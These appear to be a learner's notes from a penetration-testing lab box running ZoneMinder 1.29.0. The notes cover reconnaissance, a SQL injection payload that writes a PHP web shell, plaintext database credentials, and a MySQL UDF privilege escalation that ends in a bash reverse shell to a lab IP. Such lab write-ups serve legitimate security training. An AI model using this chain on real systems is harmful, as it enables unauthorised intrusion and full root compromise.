nmap shows ports 21 ftp, 22 ssh, 80 web, 8080 web, 3305 web
port 80 has a login page, poorly constructed, it looks like
ports 3305 and 8080 are default tomcat and apache installation pages
gobuster on all 3 --> reveals all 3 have a /zm endpoint
visiting it, we see it is a ZoneMinder v 1.29.0
searchsploit has a xss, sqli, csrf all-in-one exploit

The POC says the sqli is on /zm/indeex.php?`view=request&request=log&task=query&limit=100;(SELECT * FROM (SELECT(SLEEP(5)))OQkj)#&minTime=1466674406.084434`

which du,ps some values, prolly from the 0Qkj table?
we mod it to try and write a file into /var/www/html/rr.php

Since port 3305 is running a default Apache2 Ubuntu page, we can upload the web shell to the document root at /var/www/html, and then access it using port 3305.

change the req method to post
after struggling, as usual with sqli,
HINT TAKEN:
`view=request&request=log&task=query&limit=100;(SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/rce.php")#&minTime=1466674406.084434`
works
www-data!

---
for privesc, we see internal listening port, 3306 mysql
but we needs creds
Looked everywhere except /etc
nothing found
fired up linpeas, and it pointed to 2 usable sql creds
zmuser:zmpass
and root:ShinyLucentMarker361

the zmuser:zmpass gave a hash, but wasnt crackable
neither was it crackable for root:ShinyLucentMarker361

HINT TAKEN: mysql is being run as root, and version 5.7.3
Searchsploit shows a bunch of exploit, but appearently, the right one is
`MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2) | linux/local/1518.c`

```zsh
gcc -g -c raptor_udf2.so
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

#now transfer the raptor_udf.so to target
#and prepare a rshell.sh in /dev/shm

echo "bash -c 'bash -i >& /dev/tcp/192.168.45.156/80 0>&1'" > /dev/shm/rr.sh

mysql -u root -p
mysql> 
use mysql;
create table foo(line blob); insert into foo values(load_file('/dev/shm/raptor_udf2.so')); select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so'; create function do_system returns integer soname 'raptor_udf2.so';

#now, we can use the do_system function to give ourselves a reverse shell
mysql> select do_system('/bin/bash /dev/shm/rshell.sh')
```
